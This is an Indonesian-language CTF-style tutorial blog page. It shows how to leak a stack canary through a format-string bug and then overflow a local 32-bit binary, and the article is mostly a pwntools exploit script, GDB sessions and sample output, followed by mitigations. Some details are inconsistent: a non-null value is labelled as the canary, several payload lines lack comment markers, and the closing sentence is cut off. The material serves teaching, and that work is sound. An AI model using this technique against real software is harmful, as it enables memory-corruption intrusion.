<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />

  
  <style>
    body {
      background-color: #2e2e2e;
      color: #c7c5c5;;
      
      font-family: 'Mono', sans-serif;  
    }


    a {
      color: #48a874;  
      text-decoration: none;
    }

    a:hover {
      color: darkgray;  
    }

    a:visited {
      color: #48a874;  
    }

    .fa {
      font-family: "Font Awesome 6 Free", sans-serif;  
      font-weight: 30px;
    }
  </style>

  
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
  <link href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;700&display=swap" rel="stylesheet">

  
  
    <meta name="description" content="teknik bypassing stack canaries dengan memanfaatkan format string vulnerability untuk melakukan leak dan kemudian buffer overflow.
1. Analisis Awal dan Basic File Checks
Pertama, kita lakukan analisis dasar pada binary:
# Compile program dengan canary enabled (default pada GCC modern)
gcc -m32 -fstack-protector-all -o vuln vuln.c

# Check security protections
checksec vuln
Output yang mungkin muncul:
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
2. Review Source Code
Dari source code yang diberikan, kita identifikasi vulnerability:">
  

  <title>
    
      Bypassing Stack Canaries (Leak &#43; Write) - Pwn03.1
    
  </title>

  
  <link rel="shortcut icon" type="image/x-icon" href="/" />

  
  
  
  
  <link rel="stylesheet" href="/css/main.4b550348a06e41cd2fba1e1b4d6c5f337b2e882272420967996967c3baf38431563db8a42628c2eaecddc97c9cc0103749db58a82a4cfb5c1361495dd9dd57b0.css" integrity="sha512-S1UDSKBuQc0vuh4bTWxfM3suiCJyQglnmWlnw7rzhDFWPbikJijC6uzdyXycwBA3SdtYqCpM&#43;1wTYUld2d1XsA==" />

  
  

  
    <meta name="description" content="teknik bypassing stack canaries dengan memanfaatkan format string vulnerability untuk melakukan leak dan kemudian buffer overflow.
1. Analisis Awal dan Basic File Checks
Pertama, kita lakukan analisis dasar pada binary:
# Compile program dengan canary enabled (default pada GCC modern)
gcc -m32 -fstack-protector-all -o vuln vuln.c

# Check security protections
checksec vuln
Output yang mungkin muncul:
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
2. Review Source Code
Dari source code yang diberikan, kita identifikasi vulnerability:">
    <meta property="og:description" content="teknik bypassing stack canaries dengan memanfaatkan format string vulnerability untuk melakukan leak dan kemudian buffer overflow.
1. Analisis Awal dan Basic File Checks
Pertama, kita lakukan analisis dasar pada binary:
# Compile program dengan canary enabled (default pada GCC modern)
gcc -m32 -fstack-protector-all -o vuln vuln.c

# Check security protections
checksec vuln
Output yang mungkin muncul:
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
2. Review Source Code
Dari source code yang diberikan, kita identifikasi vulnerability:">
    <meta property="og:image" content="/path/to/default-image.jpg">
    <meta name="twitter:image" content="/path/to/default-image.jpg">

  <meta property="og:type" content="article">
  <meta property="og:url" content="/posts/bypass-stack-canary/">
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:title" content="Bypassing Stack Canaries (Leak &#43; Write) - Pwn03.1">
  <meta name="twitter:description" content="teknik bypassing stack canaries dengan memanfaatkan format string vulnerability untuk melakukan leak dan kemudian buffer overflow.
1. Analisis Awal dan Basic File Checks
Pertama, kita lakukan analisis dasar pada binary:
# Compile program dengan canary enabled (default pada GCC modern)
gcc -m32 -fstack-protector-all -o vuln vuln.c

# Check security protections
checksec vuln
Output yang mungkin muncul:
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
2. Review Source Code
Dari source code yang diberikan, kita identifikasi vulnerability:">
</head>











<body a="black">

        <main class="page-content" aria-label="Content">
            <div class="w">
<a href="/">~ $ cd /home</a>


<article>
    <p class="post-meta">
    </p>

<h1>Bypassing Stack Canaries (Leak &#43; Write) - Pwn03.1<br><br>
    <small datetime="2025-08-20 00:00:00 &#43;0000 UTC" style="font-size: 10px; display: inline-flex; align-items: center;">
        <img src="https://avatars.githubusercontent.com/u/51517043?v=4" alt="GitHub Profile" style="width: 30px; height: 30px; border-radius: 50%; object-fit: cover; margin-right: 8px;">
        2025-08-20 - Rainhynn
    </small>
</h1>

    

    <p>teknik bypassing stack canaries dengan memanfaatkan format string vulnerability untuk melakukan leak dan kemudian buffer overflow.</p>
<h2 id="1-analisis-awal-dan-basic-file-checks">1. Analisis Awal dan Basic File Checks</h2>
<p>Pertama, kita lakukan analisis dasar pada binary:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#0f0"># Compile program dengan canary enabled (default pada GCC modern)</span>
</span></span><span style="display:flex;"><span>gcc -m32 -fstack-protector-all -o vuln vuln.c
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#0f0"># Check security protections</span>
</span></span><span style="display:flex;"><span>checksec vuln
</span></span></code></pre></div><p>Output yang mungkin muncul:</p>
<pre tabindex="0"><code>Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
</code></pre><h2 id="2-review-source-code">2. Review Source Code</h2>
<p>Dari source code yang diberikan, kita identifikasi vulnerability:</p>
<ul>
<li><strong>Format String Vulnerability</strong>: <code>printf(buf)</code> tanpa format string</li>
<li><strong>Buffer Overflow Potential</strong>: <code>fgets(buf, sizeof(buf), stdin)</code> dengan batas 64 byte</li>
<li><strong>Canary Protection</strong>: Karena compiled dengan stack protector</li>
</ul>
<h2 id="3-fuzzing-dengan-format-string">3. Fuzzing dengan Format String</h2>
<p>Kita gunakan format string untuk mencari posisi canary di stack:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f00">from</span> pwn <span style="color:#f00">import</span> *
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#0f0"># Test format string dengan berbagai offset</span>
</span></span><span style="display:flex;"><span><span style="color:#f00">for</span> i in range(<span style="color:#f60">1</span>, <span style="color:#f60">20</span>):
</span></span><span style="display:flex;"><span>    p = process(<span style="color:#87ceeb">&#39;./vuln&#39;</span>)
</span></span><span style="display:flex;"><span>    p.sendlineafter(<span style="color:#87ceeb">&#39;&gt; &#39;</span>, <span style="color:#87ceeb">&#39;%</span><span style="color:#87ceeb">{}</span><span style="color:#87ceeb">$p&#39;</span>.format(i))
</span></span><span style="display:flex;"><span>    result = p.recvline().strip()
</span></span><span style="display:flex;"><span>    print(<span style="color:#87ceeb">f</span><span style="color:#87ceeb">&#34;Offset </span><span style="color:#87ceeb">{</span>i<span style="color:#87ceeb">}</span><span style="color:#87ceeb">: </span><span style="color:#87ceeb">{</span>result<span style="color:#87ceeb">}</span><span style="color:#87ceeb">&#34;</span>)
</span></span><span style="display:flex;"><span>    p.close()
</span></span></code></pre></div><p>Output contoh:</p>
<pre tabindex="0"><code>Offset 1: 0xffffd124
Offset 2: 0x64
Offset 3: 0xf7e6c620
Offset 4: 0xffffd004
Offset 5: 0x8048520
Offset 6: 0x804a000
Offset 7: 0x41414141  &lt;-- Canary biasanya dimulai dengan null byte (0x00)
Offset 8: 0xf7ffd000
Offset 9: 0xffffd1e4
Offset 10: 0x0
</code></pre><h2 id="4-identifikasi-canary-dengan-gdbpwndbg">4. Identifikasi Canary dengan GDB/Pwndbg</h2>
<p>Mari gunakan debugger untuk menemukan canary:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gdb ./vuln
</span></span></code></pre></div><p>Di dalam GDB:</p>
<pre tabindex="0"><code>(gdb) b *main+100
(gdb) r
(gdb) canary
</code></pre><p>Output:</p>
<pre tabindex="0"><code>The canary value is: 0x1f4c3d00
</code></pre><p>Kita juga bisa mencari canary secara manual:</p>
<pre tabindex="0"><code>(gdb) info frame
Stack level 0, frame at 0xffffd0c0:
 eip = 0x804856d in main; saved eip = 0xf7e13637
 Arglist at 0xffffd0b8, args: 
 Locals at 0xffffd0b8, Previous frame&#39;s sp is 0xffffd0c0
 Saved registers:
  ebx at 0xffffd0b4, ebp at 0xffffd0b8, eip at 0xffffd0bc
(gdb) x/20wx $esp
0xffffd060:     0xffffd07c      0x00000040      0x00000000      0xffffd124
0xffffd070:     0xffffd104      0x00000000      0x00000000      0x1f4c3d00  &lt;-- Canary
0xffffd080:     0x00000000      0x00000000      0x00000000      0x00000000
</code></pre><h2 id="5-eksploitasi-leak-canary-dan-buffer-overflow">5. Eksploitasi: Leak Canary dan Buffer Overflow</h2>
<p>Sekarang kita buat script exploit lengkap:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#0f0">#!/usr/bin/env python3</span>
</span></span><span style="display:flex;"><span><span style="color:#f00">from</span> pwn <span style="color:#f00">import</span> *
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context(arch=<span style="color:#87ceeb">&#39;i386&#39;</span>, os=<span style="color:#87ceeb">&#39;linux&#39;</span>)
</span></span><span style="display:flex;"><span>context.log_level = <span style="color:#87ceeb">&#39;debug&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#0f0"># BINARY = &#39;./vuln&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#0f0"># p = process(BINARY)</span>
</span></span><span style="display:flex;"><span><span style="color:#0f0"># gdb.attach(p, &#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#0f0">#     b *main+150</span>
</span></span><span style="display:flex;"><span><span style="color:#0f0">#     continue</span>
</span></span><span style="display:flex;"><span><span style="color:#0f0"># &#39;&#39;&#39;)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#0f0"># Untuk tutorial, kita gunakan contoh nilai</span>
</span></span><span style="display:flex;"><span>CANARY_OFFSET = <span style="color:#f60">7</span>
</span></span><span style="display:flex;"><span>RET_OFFSET = <span style="color:#f60">16</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f00">def</span> <span style="color:#ff0">leak_canary</span>():
</span></span><span style="display:flex;"><span>    p = process(<span style="color:#87ceeb">&#39;./vuln&#39;</span>)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#0f0"># Leak canary dengan format string</span>
</span></span><span style="display:flex;"><span>    p.sendlineafter(<span style="color:#87ceeb">&#39;&gt; &#39;</span>, <span style="color:#87ceeb">&#39;%</span><span style="color:#87ceeb">{}</span><span style="color:#87ceeb">$p&#39;</span>.format(CANARY_OFFSET))
</span></span><span style="display:flex;"><span>    canary_leak = p.recvline().strip()
</span></span><span style="display:flex;"><span>    canary = int(canary_leak, <span style="color:#f60">16</span>)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    log.info(<span style="color:#87ceeb">&#34;Leaked canary: 0x</span><span style="color:#87ceeb">{:08x}</span><span style="color:#87ceeb">&#34;</span>.format(canary))
</span></span><span style="display:flex;"><span>    p.close()
</span></span><span style="display:flex;"><span>    <span style="color:#f00">return</span> canary
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f00">def</span> <span style="color:#ff0">exploit</span>(canary):
</span></span><span style="display:flex;"><span>    p = process(<span style="color:#87ceeb">&#39;./vuln&#39;</span>)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#0f0"># Leak alamat base stack untuk menghitung alamat flag</span>
</span></span><span style="display:flex;"><span>    p.sendlineafter(<span style="color:#87ceeb">&#39;&gt; &#39;</span>, <span style="color:#87ceeb">&#39;%</span><span style="color:#87ceeb">{}</span><span style="color:#87ceeb">$p&#39;</span>.format(<span style="color:#f60">3</span>))
</span></span><span style="display:flex;"><span>    stack_leak = p.recvline().strip()
</span></span><span style="display:flex;"><span>    stack_addr = int(stack_leak, <span style="color:#f60">16</span>)
</span></span><span style="display:flex;"><span>    flag_addr = stack_addr - <span style="color:#f60">0x50</span>  <span style="color:#0f0"># Adjust berdasarkan debugger</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    log.info(<span style="color:#87ceeb">&#34;Stack leak: 0x</span><span style="color:#87ceeb">{:08x}</span><span style="color:#87ceeb">&#34;</span>.format(stack_addr))
</span></span><span style="display:flex;"><span>    log.info(<span style="color:#87ceeb">&#34;Estimated flag addr: 0x</span><span style="color:#87ceeb">{:08x}</span><span style="color:#87ceeb">&#34;</span>.format(flag_addr))
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#0f0"># Craft payload dengan canary yang benar</span>
</span></span><span style="display:flex;"><span>    payload = <span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#39;A&#39;</span> * <span style="color:#f60">64</span>          <span style="color:#0f0"># Buffer</span>
</span></span><span style="display:flex;"><span>    payload += p32(canary)       Canary yang benar
</span></span><span style="display:flex;"><span>    payload += <span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#39;B&#39;</span> * <span style="color:#f60">12</span>         Padding sampai <span style="color:#f00">return</span> address
</span></span><span style="display:flex;"><span>    payload += p32(flag_addr)    Return address - arahkan ke flag
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    p.sendlineafter(<span style="color:#87ceeb">&#39;&gt; &#39;</span>, payload)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#0f0"># Interact dengan shell</span>
</span></span><span style="display:flex;"><span>    p.interactive()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f00">if</span> <span style="color:#eedd82">__name__</span> == <span style="color:#87ceeb">&#39;__main__&#39;</span>:
</span></span><span style="display:flex;"><span>    canary = leak_canary()
</span></span><span style="display:flex;"><span>    exploit(canary)
</span></span></code></pre></div><h2 id="6-debugging-dengan-gdbpwndbg">6. Debugging dengan GDB/Pwndbg</h2>
<p>Mari lihat proses debugging saat exploit berjalan:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gdb ./vuln
</span></span><span style="display:flex;"><span>(gdb) b *main+150  <span style="color:#0f0"># Breakpoint sebelum return</span>
</span></span><span style="display:flex;"><span>(gdb) r &lt; &lt;(python3 exploit.py)
</span></span></code></pre></div><p>Ketika breakpoint terhenti, kita periksa stack:</p>
<pre tabindex="0"><code>(gdb) x/10wx $esp
0xffffd060:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd070:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd080:     0x41414141      0x41414141
(gdb) x/wx $ebp-0xc  # Lokasi canary
0xffffd0ac:     0x1f4c3d00
</code></pre><p>Kita bisa verifikasi canary tidak berubah setelah overflow.</p>
<h2 id="7-final-exploit-dan-hasil">7. Final Exploit dan Hasil</h2>
<p>Setelah menjalankan exploit, output yang sukses akan terlihat seperti:</p>
<pre tabindex="0"><code>[+] Starting local process &#39;./vuln&#39;: pid 1234
[*] Leaked canary: 0x1f4c3d00
[*] Stack leak: 0xffffd124
[*] Estimated flag addr: 0xffffd0d4
[+] Starting local process &#39;./vuln&#39;: pid 1235
[*] Switching to interactive mode
&gt; CTF{example_flag_value}
</code></pre><h2 id="8-mitigation-dan-pelajaran">8. Mitigation dan Pelajaran</h2>
<p>Teknik ini bekerja karena:</p>
<ol>
<li>Format string vulnerability memungkinkan leak nilai canary</li>
<li>Buffer overflow memungkinkan overwrite return address</li>
<li>Kita mempertahankan nilai canary yang valid</li>
</ol>
<p>Cara mencegah:</p>
<ul>
<li>Selgunakan menggunakan format string yang benar: <code>printf(&quot;%s&quot;, buf)</code></li>
<li>Gunakan stack canary dengan entropy tinggi</li>
<li>Implementasi ASLR yang efektif</li>
</ul>
<p>Dengan tutorial ini, Anda seharusnya sekarang memahami bagaimana stack canaries bekerja dan bagaimana mereka dapat di-bypass dengan kombinasi format string leak dan buffer</p>

</article>

<hr>

<p>© 2021-2025 HnvDie</p>
<p>Powered By Hugo ᯓᡣ𐭩</p>



            </div>
        </main>
    </body></html>
